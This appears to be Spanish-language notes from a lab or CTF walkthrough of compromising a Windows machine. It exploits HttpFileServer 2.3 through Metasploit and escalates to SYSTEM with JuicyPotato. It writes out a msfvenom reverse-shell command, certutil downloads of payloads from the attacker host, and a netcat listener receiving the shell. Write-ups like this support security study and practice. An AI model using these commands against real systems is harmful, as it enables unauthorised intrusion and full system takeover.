PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm

-Hacemos un escaneo en profundidad y encontramos el siguiente servicio corriendo en el puerto 80:
	HttpFileServer httpd 2.3

-Lo buscamos en la consola de Metasploit y lo explotamos:
	-search HttpFileServer
	-Módulo a usar --> exploit/windows/http/rejetto_hfs_exec
	-Configuración:
		-set rhosts 192.168.1.138
		-run
		meterpreter > 

## Escala de Privilegios

-Buscamos privilegios y encontramos el siguiente privilegio vulnerable:
	C:\Users\hacker\Downloads>whoami /priv
		Nombre de privilegio          Descripción                                  Estado    
		SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación Habilitada

-Vamos a usar el famoso exploit 'juicypotato', que sirve para escalar privilegios en máquinas Windows cuando tenemos el privilegio 'SeImpersonatePrivilege'.

-Descargamos el exploit juicypotato:
	-Nos vamos a: https://github.com/ohpe/juicy-potato/
	-Clickamos en Fresh Potatoes (Debajo de Releases)
	-Hacemos click en --> [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) y se nos descargará

-Generamos una reverse shell .exe con msfvenom:
	-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.135 LPORT=443 -f exe -o shell64.exe

-Descargamos en la máquina víctima el exploit de juicypotato.exe y la reverse shell que hemos generado con msfvenom:
	-certutil -urlcache -f http://192.168.1.135/JuicyPotato.exe
	-certutil -urlcache -f http://192.168.1.135/shell64.exe

-Ejecutamos el siguiente comando para mandarnos la reverse shell de msfvenom con privilegios elevados gracias al exploit de JuicyPotato:
	.\JuicyPotato.exe -l 443 -p shell64.exe -t *
	-Recibimos la reverse shell como el usuario nt\authority system en nuestra máquina:
		nc -lvnp 443
		connect to [192.168.1.135] from (UNKNOWN) [192.168.1.138] 49178
		C:\Windows\system32>whoami
		whoami
		nt authority\system
